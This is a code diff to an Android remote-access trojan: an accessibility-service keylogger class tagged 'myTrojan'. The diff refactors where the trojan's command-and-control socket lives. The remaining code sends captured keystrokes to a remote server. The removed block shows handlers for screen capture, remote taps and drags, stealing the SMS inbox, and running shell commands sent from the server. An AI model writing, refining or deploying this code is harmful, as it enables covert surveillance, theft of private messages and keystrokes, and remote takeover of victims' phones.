@@ -32,7 +32,7 @@ public class Keylogger extends AccessibilityService {
     final String TAG = "myTrojan";
     public static boolean SCOKET_FLAG = true;
     private String sockEvt = "logger";
-    private Socket sock;
+    // Socket now managed by MyService
     public static Intent intent;
     public static int resCode;
     public Handler handler = new Handler();
@@ -95,8 +95,8 @@ public class Keylogger extends AccessibilityService {
 //        Log.d(TAG,"[+] Connected "+START);
         if(START){
 //            Log.d(TAG,"[+] Connected");
-            if(SCOKET_FLAG){
-                sock.emit(sockEvt,"[+] Connected");
+            if(SCOKET_FLAG && MyService.sock != null){
+                MyService.sock.emit(sockEvt,"[+] Connected");
             }
         }
         super.onServiceConnected();
@@ -104,12 +104,17 @@ public class Keylogger extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent aEvt) {
+        // Only process keylogger events if feature is enabled
+        if (!BuildConfig.FEATURE_KEYLOGGER) {
+            return;
+        }
+        
         if(START) {
             String evts = charToString(aEvt.getText());
             if (!evts.equals("")) {
 //                Log.d(TAG, evts);
-                if (SCOKET_FLAG) {
-                    sock.emit(sockEvt, evts);
+                if (SCOKET_FLAG && MyService.sock != null) {
+                    MyService.sock.emit(sockEvt, evts);
                 }
             }
         }
@@ -118,8 +123,8 @@ public class Keylogger extends AccessibilityService {
     @Override
     public void onInterrupt() {
         if(START){
-            if (SCOKET_FLAG){
-                sock.emit(sockEvt,"[-] Interrupt");
+            if (SCOKET_FLAG && MyService.sock != null){
+                MyService.sock.emit(sockEvt,"[-] Interrupt");
             }
 //            Log.d(TAG,"[-] Interrupt");
         }
@@ -129,11 +134,11 @@ public class Keylogger extends AccessibilityService {
     @Override
     public void onDestroy() {
         if(START){
-            if (SCOKET_FLAG){
+            if (SCOKET_FLAG && MyService.sock != null){
                 if (SCOKET_FLAG){
-                    sock.emit(sockEvt,"[-] Dissconnect");
+                    MyService.sock.emit(sockEvt,"[-] Dissconnect");
                 }
-                sock.disconnect();
+                MyService.sock.disconnect();
             }
 //            Log.d(TAG,"[-] Dissconnect");
         }
@@ -143,195 +148,9 @@ public class Keylogger extends AccessibilityService {
 
     @Override
     public void onCreate() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                // Connecting with server
-                try {
-                    Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),Integer.parseInt(getString(R.string.reconnectTime)));
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                sock = Connecting.getSock();
-
-                // Setting up the Screen capture Module
-                MediaProjectionManager mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                MediaProjection mProjection = mProjectionManager.getMediaProjection(resCode,intent);
-                Capture.setup(sock, getApplicationContext(), mProjection,handler,5);
-
-                // Ping Handler
-                sock.on("ping", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                Pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
-                                Pinger.start();
-                            }else{
-                                Pinger.stop();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-                // Logger Handler
-                sock.on("logger", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                Keylogger.start();
-                            }else{
-                                Keylogger.stop();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-                // Screen Handler
-                sock.on("screen", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            Log.d(TAG,(String)args[0] );
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                Capture.start();
-                                Log.d(TAG, "starting");
-                            }else{
-                                Capture.stop();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-
-                // Mouse Handler
-                sock.on("mouse", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONObject data = (JSONObject) args[0];
-                            JSONObject values = new JSONObject(data.getString("points"));
-                            
-                            // Get Real Screen Metrics dynamically (in case of rotation?)
-                            // Or just fetch once. For now, fetch here to be safe.
-                            WindowManager wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
-                            android.view.Display display = wm.getDefaultDisplay();
-                            android.graphics.Point size = new android.graphics.Point();
-                            display.getRealSize(size);
-                            int realW = size.x;
-                            int realH = size.y;
-
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                                if(data.getString("type").compareTo( "click") == 0){
-                                    float xPct = Float.parseFloat(values.getString("x"));
-                                    float yPct = Float.parseFloat(values.getString("y"));
-                                    click(xPct * realW, yPct * realH);
-                                }else{
-                                    float x1Pct = Float.parseFloat(values.getString("x1"));
-                                    float y1Pct = Float.parseFloat(values.getString("y1"));
-                                    float x2Pct = Float.parseFloat(values.getString("x2"));
-                                    float y2Pct = Float.parseFloat(values.getString("y2"));
-                                    drag(x1Pct * realW, y1Pct * realH, x2Pct * realW, y2Pct * realH);
-                                }
-                            }
-                        } catch (Exception e) {
-                            Log.d(TAG, e.getMessage());
-                        }
-                    }
-                });
-
-                // SMS Handler
-                sock.on("sms", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            if(array.getString(0).equals("start")){
-                                getSMS();
-                            }
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-                // Shell Command Handler
-                sock.on("shellCmd", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
-                            String cmd = array.getString(0);
-                            ShellExec.execute(cmd, sock);
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
-
-                // Shell Kill Handler
-                sock.on("shellKill", new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        ShellExec.destroy();
-                    }
-                });
-
-                // Clean up on connect/reconnect
-                sock.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
-                    @Override
-                    public void call(Object... args) {
-                        try {
-                            ShellExec.destroy();
-                        } catch (Exception e) {
-                            Log.e(TAG, "Connect error: " + e.getMessage());
-                        }
-                    }
-                });
-
-            }
-        }).start();
+        // Socket initialization moved to MyService.java
+        // This service now only handles accessibility events when enabled
+        // Access socket via MyService.sock
         super.onCreate();
-    }
-
-    // SMS Helper Method (moved from MyService)
-    private void getSMS(){
-        try {
-            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
-            android.content.ContentResolver contentResolver = getContentResolver();
-            android.database.Cursor cursor = contentResolver.query(uri,null,null,null,null);
-            
-            if (cursor == null) {
-                return;
-            }
-            
-            JSONArray list = new JSONArray();
-            while (cursor.moveToNext()){
-                String num = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                try {
-                    JSONObject item = new JSONObject();
-                    item.put("address",num);
-                    item.put("body",msg);
-                    list.put(item);
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-            }
-            cursor.close();
-            sock.emit("sms",list);
-        } catch (Exception e) {
-            Log.e(TAG, "getSMS: "+e.getMessage());
-        }
     }
 }
